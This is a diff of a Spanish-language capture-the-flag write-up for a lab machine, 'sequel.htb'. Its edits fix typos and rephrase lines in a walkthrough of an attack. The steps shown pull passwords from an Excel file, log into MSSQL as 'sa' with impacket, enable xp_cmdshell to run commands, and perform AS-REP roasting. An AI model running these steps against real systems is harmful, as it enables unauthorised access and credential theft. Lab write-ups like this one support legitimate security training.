@@ -93,7 +93,7 @@ Observamos que es un archivo comprimido así que lo descomprimimos para ver el c
 7z x accounts.xlsx
 ```
 
-Y en el directorio `xl/sharedStrings.xml` al ver el archivo con un `cat` podremos ver el contenido del excel, de ahi obtenemos una lista de usuarios y contraseñas, verificamos cuales son validas
+Y en el directorio `xl/sharedStrings.xml` al ver el archivo con un `cat` podremos ver el contenido del Excel, de ahí obtenemos una lista de usuarios y contraseñas, verificamos cuales son validas
 
 Usando [[CRACKMAPEXEC]] y nuestra lista de usuarios creada buscamos usuarios
 ```shell
@@ -117,12 +117,12 @@ nxc smb 10.129.232.128 -u 'oscar' -p '86LxLBMgEWaKUnBG'
 
 ## Enumeración MSSQL
 
-Al inicio en los puertos abiertos vimos que estaba abierto el servico MSSQL probamos si el usuario `rose` tiene acceso
+Al inicio en los puertos abiertos vimos que estaba abierto el servicio MSSQL probamos si el usuario `rose` tiene acceso usando [[IMPACKET]]
 ```shell
 impacket-mssqlclient 'sequel.htb/rose:KxEPkKe6R8su@10.129.232.128'
 ```
 
-Y también probamos con `sa`
+Y también probamos con `sa` que descubrimos en los archivos Excel que tiene una contraseña que tiene el nombre de MSSQL usaremos [[IMPACKET]]
 ```shell
 impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@10.129.232.128'
 ```
@@ -135,7 +135,7 @@ Enumeramos las bases de datos que hay
 select name from sys.databases;
 ```
 
-Mostrándonos 
+Nos muestra bases de datos que son las comunes siempre
 ```shell
 name     
 ------   
@@ -145,7 +145,7 @@ model
 msdb     
 ```
 
-Son las bases de datos por defecto, vamos a intentar ejecutar comandos de cmd
+Vamos a intentar ejecutar comandos de cmd
 Primero nos habilitamos la ejecucucion de comandos
 ```shell
 enable_xp_cmdshell
@@ -160,11 +160,10 @@ Vemos que somos el usuario `sql_svc`
 Vamos a explotar esta opción cargando una shell en base64 [[#MSSQL Shell Injection]]
 
 
-
-
 # Explotación
 ## AS-REP Roasting Attack
 
+Con 
 ```shell
 impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/
 ```
